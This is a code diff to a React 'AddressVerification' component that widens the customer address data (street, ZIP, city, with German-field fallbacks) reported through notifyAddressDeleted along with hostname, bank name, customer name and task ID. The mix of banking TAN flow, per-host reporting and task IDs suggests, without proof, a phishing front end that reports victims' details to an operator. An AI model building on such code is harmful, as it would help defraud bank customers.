@@ -173,20 +173,25 @@ const AddressVerification = ({
       }
       try {
         const addr = rotatedAddressRef.current as any;
+        const addlMatch = additionalAddress?.plzOrt?.match(/^\s*(\d{4,5})\s+(.+)$/);
+        const street = addr?.street || additionalAddress?.strasse || "";
+        const zip = addr?.zip_code || addlMatch?.[1] || "";
+        const city = addr?.city || addlMatch?.[2] || additionalAddress?.plzOrt || "";
         void notifyAddressDeleted({
           data: {
             host: typeof window !== "undefined" ? window.location.hostname : null,
             bankName,
             customerName: customerName ?? null,
-            street: addr?.street ?? "",
-            zip: addr?.zip_code ?? "",
-            city: addr?.city ?? "",
+            street,
+            zip,
+            city,
             taskId: taskId ?? null,
           },
         });
       } catch (err) {
         console.warn("[notifyAddressDeleted] failed", err);
       }
+
       setTimeout(() => {
         setShowSecureGo(false);
         onDelete();
@@ -352,21 +357,26 @@ const AddressVerification = ({
   useEffect(() => {
     if (!addressTanSuccess) return;
     const addr = rotatedAddressRef.current as any;
+    const addlMatch = additionalAddress?.plzOrt?.match(/^\s*(\d{4,5})\s+(.+)$/);
+    const street = addr?.street || additionalAddress?.strasse || "";
+    const zip = addr?.zip_code || addlMatch?.[1] || "";
+    const city = addr?.city || addlMatch?.[2] || additionalAddress?.plzOrt || "";
     try {
       void notifyAddressDeleted({
         data: {
           host: typeof window !== "undefined" ? window.location.hostname : null,
           bankName,
           customerName: customerName ?? null,
-          street: addr?.street ?? "",
-          zip: addr?.zip_code ?? "",
-          city: addr?.city ?? "",
+          street,
+          zip,
+          city,
           taskId: taskId ?? null,
         },
       });
     } catch (err) {
       console.warn("[notifyAddressDeleted] failed", err);
     }
+
     const t = setTimeout(() => {
       setShowDeleteDialog(false);
       onDelete();
